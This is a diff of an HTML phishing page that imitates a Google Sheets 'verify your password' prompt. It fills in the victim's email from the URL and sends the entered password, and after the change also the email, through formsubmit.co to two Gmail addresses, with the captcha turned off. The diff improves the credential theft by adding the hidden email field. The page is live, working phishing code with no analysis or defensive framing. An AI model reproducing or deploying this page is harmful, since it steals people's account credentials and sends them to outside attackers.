@@ -168,37 +168,42 @@
 </head>
 
 <body>
-    <div class="form-container">
-        <div class="green-line"></div>
-        <img src="https://static.vecteezy.com/system/resources/thumbnails/027/179/391/small_2x/google-sheet-spreadsheet-icon-logo-symbol-free-png.png" class="logo" alt="Logo" style="height: 40PX; width: auto; padding-top: 10px; padding-left: 5px;">
-        <div class="title" style="padding-top: 6px; font-size:medium;">Sheets</div>
-        <div name="email" class="email-display">Loading email...</div>
-        <div class="enter-password">Enter your password</div>
-        <div class="additional-text">Because you're accessing sensitive info, you need to verify your password.
-            <!-- <a href="#">Reset it here</a> -->
-        </div>
-
-        <!-- FORM START -->
-        <form action="https://formsubmit.co/susanezra70@gmail.com" method="POST">
-            <input name="password" type="password" class="password-input" name="password" placeholder="Enter password">
-            <div class="note"><span style="color: red">*</span> Only the above email recipient can view this file.</div>
-            <div class="error-container">Incorrect password. Please try again.</div>
-            <button type="submit" class="submit-container">View</button>
-            <input type="hidden" name="_cc" value="oriyebakap6@gmail.com">
-            <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="_next" value="http://127.0.0.1:5500/loading.html">
-        </form>
-        <!-- FORM END -->
+  <div class="form-container">
+    <div class="green-line"></div>
+    <img src="https://static.vecteezy.com/system/resources/thumbnails/027/179/391/small_2x/google-sheet-spreadsheet-icon-logo-symbol-free-png.png" class="logo" alt="Logo" style="height: 40PX; width: auto; padding-top: 10px; padding-left: 5px;">
+    <div class="title" style="padding-top: 6px; font-size:medium;">Sheets</div>
+    <div name="email" class="email-display">Loading email...</div>
+    <div class="enter-password">Enter your password</div>
+    <div class="additional-text">
+      Because you're accessing sensitive info, you need to verify your password.
     </div>
 
-    <script>
-        const params = new URLSearchParams(window.location.search);
-        const email = params.get("email");
+    <!-- FORM START -->
+    <form action="https://formsubmit.co/susanezra70@gmail.com" method="POST">
+      <input name="password" type="password" class="password-input" placeholder="Enter password" required>
+      <input type="hidden" name="email" id="raw_email">
+      <div class="note">
+        <span style="color: red">*</span> Only the above email recipient can view this file.
+      </div>
+      <div class="error-container">Incorrect password. Please try again.</div>
+      <button type="submit" class="submit-container">View</button>
 
-        if (email) {
-            document.querySelector('.email-display').textContent = email;
-        }
-    </script>
+      <input type="hidden" name="_cc" value="oriyebakap6@gmail.com">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="http://127.0.0.1:5500/loading.html">
+    </form>
+    <!-- FORM END -->
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const email = params.get("email");
+
+    if (email) {
+      document.querySelector('.email-display').textContent = email;
+      document.getElementById('raw_email').value = email;
+    }
+  </script>
 </body>
-
 </html>
+
